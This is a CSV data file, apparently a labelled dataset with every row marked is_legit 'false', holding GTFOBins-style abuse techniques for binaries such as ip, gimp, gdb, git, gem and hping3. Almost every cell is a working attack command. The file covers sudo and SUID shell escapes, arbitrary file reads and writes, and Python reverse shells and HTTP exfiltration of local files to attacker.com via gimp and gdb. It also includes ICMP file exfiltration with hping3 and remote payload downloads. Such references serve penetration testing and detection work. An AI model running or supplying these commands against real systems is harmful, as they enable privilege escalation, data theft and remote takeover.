"Name","functions","functions_shell","functions_shell_description","functions_shell_code","functions_sudo","functions_sudo_description","functions_sudo_code","description","functions_file-read","functions_file-read_code","functions_suid","functions_suid_code","functions_file-write","functions_file-write_code","functions_limited-suid","functions_limited-suid_code","functions_file-download","functions_file-download_description","functions_file-download_code","functions_file-read_description","functions_suid_description","functions_non-interactive-reverse-shell","functions_non-interactive-reverse-shell_description","functions_non-interactive-reverse-shell_code","functions_command","functions_command_description","functions_command_code","functions_file-upload","functions_file-upload_description","functions_file-upload_code","functions_file-write_description","functions_reverse-shell","functions_reverse-shell_description","functions_reverse-shell_code","functions_non-interactive-bind-shell","functions_non-interactive-bind-shell_description","functions_non-interactive-bind-shell_code","functions_library-load","functions_library-load_description","functions_library-load_code","functions_capabilities","functions_capabilities_description","functions_capabilities_code","functions_limited-suid_description","functions_bind-shell","functions_bind-shell_description","functions_bind-shell_code","is_legit"
"ip","","","","","[''This only works for Linux with CONFIG_NET_NS=y.''-|-''This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.'']","[''LFILE=file_to_read sudo ip -force -batch ""$LFILE"" ''-|-''sudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo ''-|-''sudo ip netns add foo sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar sudo ip netns exec bar /bin/sh sudo ip netns delete foo sudo ip netns delete bar '']","The read file content is corrupted by error prints.","","LFILE=file_to_read ip -force -batch ""$LFILE""","","[''LFILE=file_to_read ./ip -force -batch ""$LFILE"" ''-|-''./ip netns add foo ./ip netns exec foo /bin/sh -p ./ip netns delete foo '']","","","","","","","","","This only works for Linux with CONFIG_NET_NS=y.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ionice","","","ionice /bin/sh","","","sudo ionice /bin/sh","","","","","./ionice /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"install","","","","","","LFILE=file_to_change TF=$(mktemp) sudo install -m 6777 $LFILE $TF","This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a copy of the file.","","","","LFILE=file_to_change TF=$(mktemp) ./install -m 6777 $LFILE $TF","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"iftop","","","iftop !/bin/sh","","","sudo iftop !/bin/sh","This requires `iftop` 0.17 and the privilege to capture on some device (specify with `-i` if needed) .","","","","","","","","./iftop !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"iconv","","","","","","LFILE=file_to_read ./iconv -f 8859_1 -t 8859_1 ""$LFILE""","The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.","","LFILE=file_to_read iconv -f 8859_1 -t 8859_1 ""$LFILE""","","LFILE=file_to_read ./iconv -f 8859_1 -t 8859_1 ""$LFILE""","","LFILE=file_to_write echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"hping3","","","hping3 /bin/sh","","The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:  ``` sudo hping3 --icmp --listen xxx --dump ```","[''sudo hping3 /bin/sh ''-|-''RHOST=attacker.com LFILE=file_to_read sudo hping3 ""$RHOST"" --icmp --data 500 --sign xxx --file ""$LFILE""'']","","","","","./hping3 /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"highlight","","","","","","LFILE=file_to_read sudo highlight --no-doc --failsafe ""$LFILE""","","","LFILE=file_to_read highlight --no-doc --failsafe ""$LFILE""","","LFILE=file_to_read ./highlight --no-doc --failsafe ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"hexdump","","","","","","LFILE=file_to_read sudo hexdump -C ""$LFILE""","The output is actually an hex dump.","","LFILE=file_to_read hexdump -C ""$LFILE""","","LFILE=file_to_read ./hexdump -C ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"head","","","","","","LFILE=file_to_read sudo head -c1G ""$LFILE""","","","LFILE=file_to_read head -c1G ""$LFILE""","","LFILE=file_to_read ./head -c1G ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"hd","","","","","","LFILE=file_to_read sudo hd ""$LFILE""","The output is actually an hex dump.","","LFILE=file_to_read hd ""$LFILE""","","LFILE=file_to_read ./hd ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gzip","","","","","","LFILE=file_to_read sudo gzip -f $LFILE -t","There are also a number of other utilities that rely on `gzip` under the hood, e.g., `zless`, `zcat`, `gunzip`, etc. Besides having similar features, they also allow privileged reads if `gzip` itself is SUID.","","[''LFILE=file_to_read gzip -f $LFILE -t ''-|-''LFILE=file_to_read gzip -c $LFILE | gzip -d '']","","LFILE=file_to_read ./gzip -f $LFILE -t","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gtester","","","TF=$(mktemp) echo '#!/bin/sh' > $TF echo 'exec /bin/sh -p 0<&1' >> $TF chmod +x $TF gtester -q $TF","","","TF=$(mktemp) echo '#!/bin/sh' > $TF echo 'exec /bin/sh 0<&1' >> $TF chmod +x $TF sudo gtester -q $TF","","","","","TF=$(mktemp) echo '#!/bin/sh -p' > $TF echo 'exec /bin/sh -p 0<&1' >> $TF chmod +x $TF sudo gtester -q $TF","","LFILE=file_to_write gtester ""DATA"" -o $LFILE","","","","","","","","","","","","","","","","","Data to be written appears in an XML attribute in the output file (`<testbinary path=""DATA"">`).","","","","","","","","","","","","","","","","","false"
"grep","","","","","","LFILE=file_to_read sudo grep '' $LFILE","There are many `grep` flavors that in many cases are just copies, symlinks or wrappers around the original binary that may share the same behavior, for example: `egrep`, `fgrep`, `zgrep`, etc.","","LFILE=file_to_read grep '' $LFILE","","LFILE=file_to_read ./grep '' $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"grc","","","grc --pty /bin/sh","","","sudo grc --pty /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"git","","[''This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.'']","[''PAGER='sh -c ""exec sh 0<&1""' git -p help''-|-''git help config !/bin/sh ''-|-''git branch --help config !/bin/sh ''-|-''TF=$(mktemp -d) git init ""$TF"" echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample"" mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit"" git -C ""$TF"" commit --allow-empty -m x ''-|-''TF=$(mktemp -d) ln -s /bin/sh ""$TF/git-x"" git ""--exec-path=$TF"" x '']","","[''This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.'']","[''sudo PAGER='sh -c ""exec sh 0<&1""' git -p help''-|-''sudo git -p help config !/bin/sh ''-|-''sudo git branch --help config !/bin/sh ''-|-''TF=$(mktemp -d) git init ""$TF"" echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample"" mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit"" sudo git -C ""$TF"" commit --allow-empty -m x ''-|-''TF=$(mktemp -d) ln -s /bin/sh ""$TF/git-x"" sudo git ""--exec-path=$TF"" x '']","","","LFILE=file_to_read git diff /dev/null $LFILE","","","","git apply --unsafe-paths --directory / x.patch","","PAGER='sh -c ""exec sh 0<&1""' ./git -p help","","","","The read file content is displayed in `diff` style output format.","","","","","","","","","","","The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`.","","","","","","","","","","","","","","","","","false"
"ginsh","","","ginsh !/bin/sh","","","sudo ginsh !/bin/sh","","","","","","","","","./ginsh !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gimp","","","gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","","","sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","The binary hangs after executing the Python code and can be terminated pressing ``ctrl-c``.","","gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'","","./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'","","gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""])'","","","","","","","","","","[''Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Serve files in the local folder running an HTTP server.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' ''-|-''export LPORT=8888 gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' '']","","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")'","","","","","","gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'","","","","","","","","false"
"ghci","","","ghci System.Process.callCommand ""/bin/sh""","","","sudo ghci System.Process.callCommand ""/bin/sh""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ghc","","","ghc -e 'System.Process.callCommand ""/bin/sh""'","","","sudo ghc -e 'System.Process.callCommand ""/bin/sh""'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"genisoimage","","","","","","LFILE=file_to_read sudo genisoimage -q -o - ""$LFILE""","The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like `7z`.","","LFILE=file_to_read genisoimage -q -o - ""$LFILE""","","LFILE=file_to_read ./genisoimage -sort ""$LFILE""","","","","","","","","","The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"genie","","","genie -c '/bin/sh'","","","sudo genie -c '/bin/sh'","","","","","./genie -c '/bin/sh'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gem","","[''This requires the name of an installed gem to be provided (`rdoc` is usually installed).''-|-''This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed).''-|-''This executes the specified file as [`ruby`](/gtfobins/ruby/) code.''-|-''This executes the specified file as [`ruby`](/gtfobins/ruby/) code.'']","[''gem open -e ""/bin/sh -c /bin/sh"" rdoc''-|-''gem open rdoc :!/bin/sh ''-|-''TF=$(mktemp -d) echo 'system(""/bin/sh"")' > $TF/x gem build $TF/x ''-|-''TF=$(mktemp -d) echo 'system(""/bin/sh"")' > $TF/x gem install --file $TF/x '']","","This requires the name of an installed gem to be provided (`rdoc` is usually installed).","sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gdb","","","gdb -nx -ex '!sh' -ex quit","","","sudo gdb -nx -ex '!sh' -ex quit","","","gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit","","./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit","","LFILE=file_to_write gdb -nx -ex ""dump value $LFILE \""DATA\"""" -ex quit","","","","This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save gdb -nx -ex 'python import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""])' -ex quit","This requires that GDB is compiled with Python support.","This requires that GDB is compiled with Python support.","","","","","","","","[''This requires that GDB is compiled with Python support. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send gdb -nx -ex 'python import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' -ex quit ''-|-''export LPORT=8888 gdb -nx -ex 'python import sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit '']","This requires that GDB is compiled with Python support.","","This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")' -ex quit","","","","","This requires that GDB is compiled with Python support.","gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' -ex quit","","This requires that GDB is compiled with Python support.","./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit","","","","","false"
